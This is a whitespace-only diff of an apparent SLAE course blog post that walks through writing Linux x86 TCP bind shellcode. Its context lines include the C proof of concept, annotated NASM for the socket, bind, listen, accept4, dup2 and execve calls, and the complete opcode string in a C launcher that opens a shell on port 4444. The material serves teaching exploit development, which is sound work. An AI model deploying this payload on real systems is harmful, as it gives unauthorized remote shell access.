@@ -44,7 +44,7 @@ the shellcode as small as possible.
 {% highlight c %}
 /*
  * tcp_bind_shellcode_poc.c: binds on a given TCP port and spawn a shell
- * on incoming connections. 
+ * on incoming connections.
  *
  * BSD 2-Clause License
  *
@@ -75,8 +75,8 @@ int main(int argc, char **argv) {
 	memset(&my_addr, 0, sizeof(struct sockaddr));
 
 	my_addr.sin_family 	= AF_INET;
-	my_addr.sin_port 	= htons(DPORT); 
-	my_addr.sin_addr.s_addr = INADDR_ANY; 
+	my_addr.sin_port 	= htons(DPORT);
+	my_addr.sin_addr.s_addr = INADDR_ANY;
 
 	bind(sfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
 
@@ -125,9 +125,9 @@ to the Operating System to choose the default one.
 
 {%highlight asm%}
 ; Creating the socket.
-; 
+;
 ; int socket(int domain, int type, int protocol);
-; 
+;
 ; socket() is defined as #define __NR_socket 359 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 ; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
 ; SOCK_STREAM is defined as 1 in /usr/include/i386-linux-gnu/bits/socket_type.h
@@ -178,8 +178,8 @@ higher level.
 memset(&my_addr, 0, sizeof(struct sockaddr));
 
 my_addr.sin_family 	= AF_INET;
-my_addr.sin_port 	= htons(DPORT); 
-my_addr.sin_addr.s_addr = INADDR_ANY; 
+my_addr.sin_port 	= htons(DPORT);
+my_addr.sin_addr.s_addr = INADDR_ANY;
 {% endhighlight %}
 
 The assembly code loading bind parameters and invoking system call is the
@@ -188,8 +188,8 @@ following.
 ; Binding the socket to 0.0.0.0 address at port 4444
 ;
 ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-; 
-; 
+;
+;
 ; bind() is defined as #define __NR_bind 361 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
 xor eax, eax
@@ -224,9 +224,9 @@ backlog. In our case, the backlog is zero.
 
 {%highlight asm%}
 ; Listening on opened socket bound to port 4444
-; 
+;
 ; int listen(int sockfd, int backlog);
-; 
+;
 ; listen() is defined as #define __NR_listen 363 in /usr/include/i386-linux-gnu/asm/unistd_32.h
 xor ecx, ecx
 xor eax, eax
@@ -247,7 +247,7 @@ process to block itself waiting for incoming connections.
 The call prototype is the following, where addr and addrlen are pointers to
 data structures storing information about our peer. Since we don't care about
 managing incoming connection IP address or TCP port, we pass accept NULL
-pointers. 
+pointers.
 
 {%highlight c%}
 int accept(int socket, struct sockaddr *addr, socklen_t *addrlen);
@@ -294,8 +294,8 @@ ESI register is used to handle the fourth parameter and it is set to 0.
 ; Accepting incoming connection on listening socket
 ;
 ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-; 
-; accept() is not defined as syscall in /usr/include/i386-linux-gnu/asm/unistd_32.h. 
+;
+; accept() is not defined as syscall in /usr/include/i386-linux-gnu/asm/unistd_32.h.
 ; Instead accept4() is defined as #define __NR_accept4 364.
 ;
 ; From the man page, accept4() has the followint prototype:
@@ -345,7 +345,7 @@ code and also to practice me with jump instructions.
 ; Duplicating descriptor 0, 1, 2 to the socket opened by client
 ;
 ; int dup2(int oldfd, int newfd);
-; 
+;
 ; dup2 is defined as #define __NR_dup2 63 in /usr/include/i386-linux-gnu/asm/unistd_32.h
 
 xor ecx, ecx
@@ -355,7 +355,7 @@ xor eax, eax
 dup2:
 	mov al, 0x3F	; 63 in decimal
 	int 0x80	; duplicating file descriptors in backwards order; from 2 to 0
-	dec ecx 
+	dec ecx
 	jns dup2
 {%endhighlight%}
 
@@ -389,7 +389,7 @@ In assembler everythins is translated as:
 
 {%highlight asm%}
 ; Executing shell
-; 
+;
 ; int execve(const char *filename, char *const argv[], char *const envp[]);
 ; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
@@ -470,22 +470,22 @@ Putting all pieces together, this is the first assignment solution in assembler.
 
 {% highlight assembly %}
 ; Filename: 	tcp_bind_shellcode_light.nasm
-; Author:	    Paolo Perego <paolo@codiceinsicuro.it>  
+; Author:	    Paolo Perego <paolo@codiceinsicuro.it>
 ; Website:  	https://codiceinsicuro.it
 ; Twitter:    @thesp0nge
 ; SLAE-ID:    1217
-; Purpose: binds on TCP port 4444 and spawn a shell on incoming connections. 
+; Purpose: binds on TCP port 4444 and spawn a shell on incoming connections.
 
 
-global _start			
+global _start
 
 section .text
 
 _start:
 	; Creating the socket.
-	; 
+	;
 	; int socket(int domain, int type, int protocol);
-	; 
+	;
 	; socket() is defined as #define __NR_socket 359 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 	; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
 	; SOCK_STREAM is defined as 1 in /usr/include/i386-linux-gnu/bits/socket_type.h
@@ -506,8 +506,8 @@ _start:
 	; Binding the socket to 0.0.0.0 address at port 4444
 	;
 	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-	; 
-	; 
+	;
+	;
 	; bind() is defined as #define __NR_bind 361 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
 	xor eax, eax
@@ -522,9 +522,9 @@ _start:
 	int 0x80		; bind(sfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
 
 	; Listening on opened socket bound to port 4444
-	; 
+	;
 	; int listen(int sockfd, int backlog);
-	; 
+	;
 	; listen() is defined as #define __NR_listen 363 in /usr/include/i386-linux-gnu/asm/unistd_32.h
 	xor ecx, ecx
 	xor eax, eax
@@ -534,8 +534,8 @@ _start:
 	; Accepting incoming connection on listening socket
 	;
 	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-	; 
-	; accept() is not defined as syscall in /usr/include/i386-linux-gnu/asm/unistd_32.h. 
+	;
+	; accept() is not defined as syscall in /usr/include/i386-linux-gnu/asm/unistd_32.h.
 	; Instead accept4() is defined as #define __NR_accept4 364.
 	;
 	; From the man page, accept4() has the followint prototype:
@@ -543,7 +543,7 @@ _start:
 	;
 	; The last integer, as from the man page, if set to 0 makes the
 	; accept4() call to behave as the same as the accept()
-	
+
 	xor eax, eax
 	mov ax, 0x16c		; 364 in decimal
 
@@ -560,7 +560,7 @@ _start:
 	; Duplicating descriptor 0, 1, 2 to the socket opened by client
 	;
 	; int dup2(int oldfd, int newfd);
-	; 
+	;
 	; dup2 is defined as #define __NR_dup2 63 in /usr/include/i386-linux-gnu/asm/unistd_32.h
 
 	xor ecx, ecx
@@ -570,11 +570,11 @@ _start:
 dup2:
 	mov al, 0x3F	; 63 in decimal
 	int 0x80	; duplicating file descriptors in backwards order; from 2 to 0
-	dec ecx 
+	dec ecx
 	jns dup2
 
 	; Executing shell
-	; 
+	;
 	; int execve(const char *filename, char *const argv[], char *const envp[]);
 	; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
@@ -583,7 +583,7 @@ dup2:
 	push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
 	push 0x6e69622f ; "nib/"
 	mov ebx, esp	; EBX now points to "/bin//sh"
-	
+
 	xor ecx, ecx
 	xor edx, edx
 	mov al, 0xB	; 11 in decimal
@@ -606,7 +606,7 @@ I added this shellcode into a C program, trying to execute it in order to check 
 
 unsigned char code[] = \
 "\x31\xc0\x89\xc3\x89\xc1\x89\xc2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0\x66\xb8\x69\x01\x31\xc9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x31\xc9\x31\xc0\x66\xb8\x6b\x01\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x51\x89\xce\x89\xe1\x89\xe2\xcd\x80\x89\xc3\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";
-		       
+
 int main(int argc, char **argv)
 {
 	printf("Shellcode Length:  %d\n", strlen(code));
@@ -690,7 +690,7 @@ inserted in the shellcode.c helper program.
 
 unsigned char code[] = \
 "SHELLCODE";
-		       
+
 int main(int argc, char **argv)
 {
 	printf("Shellcode Length:  %d\n", strlen(code));
@@ -708,7 +708,7 @@ successfully spawned when connecting to it.
 Now it's time to change the PORT. For such a reason, I'm going to use the
 python script providing a different port number, 5555 in this case. I pasted
 the obtained shellcode into the C launcher, compile it, run it and as you can
-see everything works as expected and a shell is spawned when connecting to port 5555.  
+see everything works as expected and a shell is spawned when connecting to port 5555.
 
 {% asciicast 180520 %}
 
@@ -719,4 +719,3 @@ This blog post has been created for completing the requirements of the SecurityT
 [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
 
 Student ID: SLAE-1217
-
